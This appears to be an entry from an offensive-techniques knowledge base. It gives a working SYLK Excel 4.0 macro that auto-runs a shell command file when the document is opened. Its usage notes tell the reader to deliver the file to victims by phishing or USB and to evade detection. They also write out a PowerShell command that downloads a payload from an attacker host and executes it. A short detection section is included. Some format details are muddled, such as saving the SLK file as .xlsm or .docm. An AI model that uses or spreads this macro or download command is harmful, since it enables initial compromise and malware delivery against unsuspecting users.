---
id: 868c306d-9213-4e87-b0f5-15c29cba4b99
type: code
language: slk-exec
verified: true
created_at: '2023-04-06T03:56:23.346878+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - office-macro
  - shell-execution
validated: true
---

# SLK-EXEC-Execute-Shell-Command-Macro

## Code

```slk-exec
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:\shell.cmd")
C;X1;Y102;K0;EHALT()
E
```

## Description

This SLK-EXEC macro script automates the execution of a shell command file upon opening an Office document. It configures an auto-open event (NN;NAuto_open), uses EEXEC to invoke the specified batch file (e.g., c:\shell.cmd), and employs EHALT to terminate the script cleanly, preventing unintended further actions. The script is designed for embedding in Microsoft Office files to achieve command execution in a low-detection manner.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| c:\shell.cmd | Full path to the batch or shell command file to execute | c:\temp\recon.cmd |

## Usage

Embed this macro into an Office document (e.g., via SLK-EXEC add-in interface or compatible editor) and save as a macro-enabled file (.xlsm or .docm). Deliver to the target via phishing or USB. When the document opens, the auto-open triggers the execution of the referenced shell file. Customize the path parameter to point to a prepared command file containing the desired actions, such as reconnaissance (dir /s) or payload download (powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')). Used in procedures like [[procedures/SLK-EXEC-Shell-Command-Execution]] for initial execution in Office-heavy environments.

## Detection

- Office event logs showing auto-open macros or add-in invocations (enable Office auditing).
- Process monitoring for Office apps spawning cmd.exe or unexpected batch files (e.g., via Sysmon Event ID 1 with Image: cmd.exe, ParentImage: EXCEL.EXE).
- File creation events for suspicious batch files in user-writable paths like c:\.
- Behavioral EDR alerts on Office-to-shell execution chains.

## Related

- [[procedures/SLK-EXEC-Shell-Command-Execution]]
